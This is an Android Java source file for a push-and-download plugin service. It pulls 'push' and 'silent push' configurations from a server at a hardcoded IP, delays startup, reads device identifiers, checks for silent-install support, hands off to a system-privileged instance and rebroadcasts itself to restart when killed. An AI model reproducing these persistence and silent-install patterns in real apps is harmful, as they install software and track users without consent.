package com.tiho.dlplugin.export;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import com.tiho.base.base.HttpCommonUtil;
import com.tiho.base.base.http.HttpHelper;
import com.tiho.base.base.http.json.JsonUtil;
import com.tiho.base.base.md.Md;
import com.tiho.base.base.md.Md.IDownLoadCB;
import com.tiho.base.base.md.Md.MdCbData;
import com.tiho.base.base.md.MdDTO;
import com.tiho.base.common.CfgIni;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushConfigBean;
import com.tiho.dlplugin.bean.PushSilentConfig;
import com.tiho.dlplugin.common.CommonInfo;
import com.tiho.dlplugin.condition.ConditionManager;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.display.IPushHelper;
import com.tiho.dlplugin.display.PushHelpImpl;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.TaskManager;
import com.tiho.dlplugin.util.CommonUtil;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.NetworkUtil;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.PushDirectoryUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.StringUtils;
import com.tiho.dlplugin.util.Urls;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.sql.Time;
import java.text.MessageFormat;

public class PushServiceImp {
    //for debug start
    public static long sSilentSInterval;//服务端返回的静默请求间隔
    public static long sPushSInterval;//服务端返回的普通push请求间隔

    //for debug end
    // 推送模块
    private IPushHelper pushHelper;

    private PushConfigDAO configDao;

    public static final int WHAT_START_PUSH = 0x22;

    // 是否是自己主动停止
    private boolean stoppedByMySelf = false;
    private Context mContext;
    private static PushServiceImp pushServiceImp;

    public static synchronized PushServiceImp getInstance(Context context) {
        if (pushServiceImp == null) {
            pushServiceImp = new PushServiceImp(context);
        }
        return pushServiceImp;
    }

    private PushServiceImp(Context context) {
//		super();
        this.mContext = context;
        pushHelper = new PushHelpImpl(context);
        //configDao = PushConfigFileDAOImpl    DAO 数据访问对象
        configDao = DAOFactory.getConfigDAO(context);

    }

    private Handler handler = new Handler() {

        @Override
        public void handleMessage(Message msg) {

            if (msg.what == PushConfigDAO.PUSH_CONFIG_GOT) {

                LogManager.LogShow("成功获取push配置信息");

                // 初始化定时任务
                TaskManager.init(mContext);

                pushHelper.startPush();

            }
        }
    };

    public void onCreate() {
        CommonUtil.getFirstTime(mContext);
    }

    public int onStartCommand() {
        //v50 启动时检查push文件锁
        if (ConditionManager.isPushOnLock(mContext)) {
            LogManager.LogShow("push.lck被锁,进程结束");
            stoppedByMySelf = true;
        } else {
            //如果是无系统权限的push尝试启动有系统权限的push
            if (!SilentInstall.bgInstallSupport(mContext)) {
                boolean ret = startSystemPush(mContext);
                if (ret) {
                    LogManager.LogShow("启动有系统权限的push成功，进程结束");
                    stoppedByMySelf = true;
                    return Service.START_STICKY;
                }
            } else {
                String s = mContext.getPackageName() + "&" + "com.ryg.dynamicload.DLProxyService";
                writeSystemPush(mContext, s.getBytes());
            }
            try {
                // 初始化config信息
                LogManager.LogShow("初始化initConfig");
                initConfig();

            } catch (Exception e) {
                LogManager.LogShow("初始化push配置信息失败");
                LogManager.LogShow(e);
            }
        }
        return Service.START_STICKY;
    }

    private void initConfig() {

        new Thread(new Runnable() {
            @Override
            public void run() {

                //test
                try {
                    LogManager.LogShow("40秒休眠开始");
                    Thread.sleep(40 * 1000);
                    LogManager.LogShow("40秒休眠结束");
                    HttpCommonUtil.getInstance().init(mContext);
                    LogManager.LogShow("初始化imsi,playmeid等...");
                } catch (InterruptedException e) {
                    LogManager.LogShow(e);
                }
                LogManager.LogShow("网络是否正常: " + NetworkUtil.isNetworkOk(mContext));
                //test

                try {
                    //用PushConfigBean默认的默认构造器生成一个对象并返回该对象
                    PushConfigBean config = configDao.getConfigByKey("config", PushConfigBean.class);
                    //configDao.overOneDay("config")--->如果文件"push_config.dat"不存在或者距离上一次修改时间超过一天就返回true,
                    //距离上一次修改时间不到一天就为false
                    if (config == null || configDao.overOneDay("config")) {//文件"push_config.dat"不存在或者距离上一次修改时间超过一天


                        Md mdConfig = new Md(mContext);
                        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                            int configver = CfgIni.getInstance().getValue("common", "version", 0);
                            String configPath = Environment.getExternalStorageDirectory().toString() + File.separator + "config_shoot.ini";
                            String t = PushStat.getInstance(mContext).getConfigReqTime();
                            final String time = (t == null || t.equals("")) ? "0" : t;//t==null--->time = "0"
                            //请求更新“config_shoot.ini”这个文件
                            mdConfig.mdDownload(configPath, time, configver, new IDownLoadCB() {

                                @Override
                                public void callback(int result, MdCbData data, Object obj) {
                                    if (result == 0xffff) {
                                        MdDTO dto = (MdDTO) obj;

                                        if (dto != null && !StringUtils.isEmpty(dto.getTime())) {

                                            PushStat.getInstance(mContext).setConfigReqTime(dto.getTime());

                                            LogManager.LogShow("写入config请求时间为:" + dto.getTime());

                                        } else {
                                            LogManager.LogShow("请求config结果为空 或者time为空");
                                        }

                                    }

                                }

                            });
                        }
                        //Google Analytics
                        try {
                            initPushConfig();
                            initSilentConfig();
                            handler.sendEmptyMessage(PushConfigDAO.PUSH_CONFIG_GOT);
                        } catch (Exception e) {
                            LogManager.LogShow(e);
                        }

                    } else {//文件"push_config.dat"存在并且距离上一次修改时间不超过一天
                        handler.sendEmptyMessage(PushConfigDAO.PUSH_CONFIG_GOT);
                    }

                } catch (Exception e) {
                    LogManager.LogShow(e);
                }
            }
        }).start();
    }

    private void initPushConfig() {
        String ver = CommonInfo.getInstance(mContext).getPluginVer();//插件版本
        // url= "http://122.227.207.66:8888/api/push/getpushcfg2.json?push_ver=9"
        String url = MessageFormat.format(Urls.getInstance().getPushConfigURL(), ver);
        LogManager.LogShow("网络是否正常: " + NetworkUtil.isNetworkOk(mContext));
        String response = HttpHelper.getInstance(mContext).simpleGet(url);

        if (!StringUtils.isEmpty(response)) {
            try {
                LogManager.LogShow("返回config:" + response);
                PushConfigBean config = toPushConfigBean(response);
                LogManager.LogShow("返回config config.getReqGap():" + config.getReqGap());
                sPushSInterval = config.getReqGap() * 60000L;
                LogManager.LogShow("返回config sSInterval:" + sPushSInterval);
                configDao.saveConfig("config", config);//存储到"push_config.dat"文件中和cache这个HashMap中
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        } else {
            LogManager.LogShow("无push config内容返回");
        }
    }

    /**
     * 初始化静默config
     */
    private void initSilentConfig() {
        String ver = CommonInfo.getInstance(mContext).getPluginVer();
        // url = "http://122.227.207.66:8888/api/push/getsilentpushcfg2.json?push_ver=9"
        String url = MessageFormat.format(Urls.getInstance().getSilentConfigUrl(), ver);
        LogManager.LogShow("网络是否正常: " + NetworkUtil.isNetworkOk(mContext));
        String response = HttpHelper.getInstance(mContext).simpleGet(url);

        if (!StringUtils.isEmpty(response)) {
            try {
                LogManager.LogShow("返回silent config:" + response);
                PushSilentConfig config = JsonUtil.fromJson(response, PushSilentConfig.class);
                LogManager.LogShow("返回silent config.getSri():" + config.getSri());
                sSilentSInterval = config.getSri() * 60000L;
                LogManager.LogShow("返回silent sSInterval:" + sSilentSInterval);
                DAOFactory.getConfigDAO(mContext).saveConfig("silentcfg", config);

            } catch (Exception e) {

                throw new RuntimeException(e);
            }
        } else {
            LogManager.LogShow("无silent config内容返回");
        }
    }

    private PushConfigBean toPushConfigBean(String json) {

        PushConfigBean config = new PushConfigBean();

        JSONObject jo = null;
        try {
            jo = new JSONObject(json);
            config.setMaxShow(jo.getInt("maxShow"));
            config.setMaxPushNum(jo.getInt("maxPushNum"));
            config.setReqGap(jo.getInt("reqGap"));
            config.setPushGap(jo.getInt("pushGap"));
            config.setDownIp(jo.getString("downIp"));
            config.setDownHost(jo.getString("downHost"));

            JSONObject timeJo = jo.getJSONObject("pushTime");

            config.setBegin(Time.valueOf(timeJo.getString("begin")));
            config.setEnd(Time.valueOf(timeJo.getString("end")));
            config.setActTime(jo.getString("actTime"));

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return config;
    }

    public void onDestroy() {

        if (!stoppedByMySelf) {

            LogManager.LogShow("Push service is on destroy . Send a broadcast to restart");

            Intent intent = new Intent("DLP.SERVICE.ON_DESTROY");
            intent.putExtra("SERVICE.NAME", "DLP.SERVICE");
            mContext.sendBroadcast(intent);

        }
    }

    private static final String SYSTEM_PUSH_TXT = "sysp.txt";

    private void writeSystemPush(Context context, byte[] data) {
        File dir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.PUBLIC_DIR);
        File file = new File(dir, SYSTEM_PUSH_TXT);
        try {
            if (file.exists()) {
                file.delete();
            }
            FileUtil.writeToFile(file, data, false);
        } catch (Exception e) {
            LogManager.LogShow(e);
        }
    }

    /**
     * 获取有系统权限push的包名和类名
     *
     * @param context
     * @return
     */
    private String[] readSystemPush(Context context) {
        String[] str = null;
        try {
            File dir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.PUBLIC_DIR);
            File file = new File(dir, SYSTEM_PUSH_TXT);
            if (file.exists()) {
                FileInputStream fis = new FileInputStream(file);
                InputStreamReader isr = new InputStreamReader(fis);
                BufferedReader br = new BufferedReader(isr);

                String line = br.readLine();
                LogManager.LogShow("getSystemPush line = " + line);
                if (!TextUtils.isEmpty(line)) {
                    String[] s = line.split("&");
                    if (s != null && s.length == 2) {
                        str = s;
                    }
                }
                if (br != null) {
                    br.close();
                }
                if (isr != null) {
                    isr.close();
                }
                if (fis != null) {
                    fis.close();
                }
            }
        } catch (Exception e) {
            LogManager.LogShow(e);
        }
        return str;
    }

    /**
     * 启动有系统权限的push
     *
     * @param context
     * @return
     */
    private boolean startSystemPush(Context context) {
        boolean ret = false;
        String type = "service";
        String[] str = readSystemPush(context);
        LogManager.LogShow("startSystemPush str = " + str);
        if (str != null && str.length == 2) {
            String packName = str[0];
            String className = str[1];
            LogManager.LogShow("startSystemPush packName = " + packName + ", className = " + className);
            if (!packName.equals(context.getPackageName())) {
                try {
                    Intent i = new Intent();
                    ComponentName cn = new ComponentName(packName, className);
                    i.setComponent(cn);
                    context.startService(i);
                    ret = true;
                } catch (Exception e) {
                    ret = false;
                    type = "app";
                    LogManager.LogShow("startSystemPush startService exception, try to open app.");
                    LogManager.LogShow(e);
                    try {
                        PackageUtil.openApp(context, packName);
                        ret = true;
                    } catch (Exception e2) {
                        ret = false;
                        LogManager.LogShow("startSystemPush openApp exception.");
                        LogManager.LogShow(e);
                    }
                }
                LogUploadManager.getInstance(context).uploadStartSystemPushLog(type, ret);
            }
        }
        LogManager.LogShow("startSystemPush ret = " + ret);
        return ret;
    }
}
